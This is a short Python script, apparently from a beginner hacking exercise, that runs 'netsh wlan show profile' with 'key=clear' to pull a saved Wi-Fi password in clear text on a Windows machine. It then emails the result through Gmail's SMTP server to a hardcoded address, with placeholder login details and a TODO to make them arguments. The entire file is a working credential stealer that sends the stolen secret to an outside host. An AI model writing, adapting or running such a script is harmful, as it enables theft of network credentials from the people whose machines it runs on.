#! /usr/bin/env python

import subprocess
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# TODO: add so that smtp server and user details are arguments
wlan_name = "Vectra-WiFi-xxxxxx"
command = f"netsh wlan show profile {wlan_name} key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("example@gmail.com", "password", result)  # fill with necessary data for it to work
